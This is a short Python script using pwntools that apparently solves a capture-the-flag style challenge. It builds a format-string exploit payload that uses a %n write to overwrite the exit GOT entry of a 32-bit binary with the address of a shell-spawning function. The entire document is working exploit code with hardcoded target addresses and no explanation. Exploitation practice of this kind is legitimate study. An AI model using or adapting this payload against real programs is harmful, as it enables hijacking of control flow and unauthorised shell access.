#!/usr/bin/env python3

from pwn import *

arg_num = str(input("> ")).encode().strip()
exit_got_plt = p32(0x08049838)
shell = str(0x80484A4).encode()
padding = b"A"

payload = b"%" + shell + b"x"
payload += b"%" + arg_num + b"$n" + padding
payload += exit_got_plt

print(payload)